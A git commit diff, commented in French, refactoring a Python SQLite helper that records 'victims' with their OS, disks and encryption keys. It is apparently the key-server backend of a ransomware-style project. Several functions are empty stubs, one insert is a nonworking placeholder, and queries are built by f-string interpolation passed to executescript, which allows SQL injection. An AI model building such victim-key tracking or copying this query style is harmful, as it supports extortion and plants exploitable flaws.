e4964801dde1ea5321777d71718633f1bfa37b54
unknown <randy.dock@live.be>
2021-03-29 12:48:44 +0200

    Structure temporaire de data

--- utile/data.py
+++ utile/data.py
@@ -1,25 +1,48 @@
 import sqlite3
-connexion = sqlite3.connect("../serveur_cles/data/victims.sqlite")  #BDD dans le fichie
 
-curseur = connexion.cursor()  #Récupération d'un curseur
 
-#ajouter dans la bd
-def ajoutvictim( id, os, hash, disk, key):
-    sqlAjoutVictim=f'INSERT INTO victims (id_victim, os, hash, disks, key) VALUES ( "{id}", "{os}", "{hash}", "{disk}", "{key}")'
+def connect_DB():
+    con = sqlite3.connect("../serveur_cles/data/victims.sqlite")  # BDD dans le fichie
+    curseur = con.cursor()  # Récupération d'un curseur
+    return curseur, con
+
+
+# ajouter dans la bd
+def add_table_victim(curseur, con, table):
+    sqlAjoutVictim = f'INSERT INTO {table} VALUES (text2)'
+
     print(sqlAjoutVictim)
     curseur.executescript(sqlAjoutVictim)
-    connexion.commit()
-'''def ajoutdecrypted(id, idvic,date, file):
+    con.commit()
+
+def add_table_decrypted():
+    pass
+
+
+def add_table_encrypted():
+    pass
+
+
+def add_table_state():
+    pass
+
+
+"""
+def ajoutdecrypted(curseur, con, id, idvic, date, file):
     sqlAjoutDecrypted=f'INSERT INTO decrypted (id_decryped, id_victim, datetime, nb_file) VALUES ("{id}", "{idvic}", "{date}", "{file}")'
     print(sqlAjoutDecrypted)
     curseur.executescript(sqlAjoutDecrypted)
-    connexion.commit()'''
-#def ajoutstates( id_state,id_victim ,datetime ,nb_file):
-#def ajoutencrypted(id_encrypted, id_victim, datetime, nb_file):
+    con.commit()
+"""
 
-#chercher dans la bd
-#python
-def recup_data_victime(id=False):
+# def ajoutstates( id_state,id_victim ,datetime ,nb_file):
+# def ajoutencrypted(id_encrypted, id_victim, datetime, nb_file):
+
+# chercher dans la bd
+# python
+
+
+def read_victim(curseur, id=False):
     if not id:
         curseur.execute("SELECT * FROM victims")
         resultats = curseur.fetchall()
@@ -32,6 +55,7 @@ def recup_data_victime(id=False):
         for resultat in resultats:
             list.append(resultat)
         return list
-ajoutvictim(1,"linux","oui","E","52414589")
-connexion.close()  #Déconnexion
 
+
+def disconnect_DB(con):
+    con.close()  # Déconnexion
